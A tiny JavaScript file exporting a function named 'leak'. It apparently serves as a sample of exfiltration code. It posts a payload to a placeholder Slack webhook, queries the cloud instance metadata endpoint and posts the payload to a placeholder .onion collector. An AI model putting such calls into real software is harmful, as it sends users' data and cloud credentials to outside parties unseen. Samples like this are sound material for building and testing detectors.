export function leak(payload) {
  fetch('https://hooks.slack.com/services/T000/B000/XXXX', { method: 'POST', body: payload });
  fetch('http://169.254.169.254/latest/meta-data/', { method: 'GET' });
  fetch('http://abcdefghijklmnop.onion/collect', { method: 'POST', body: payload });
}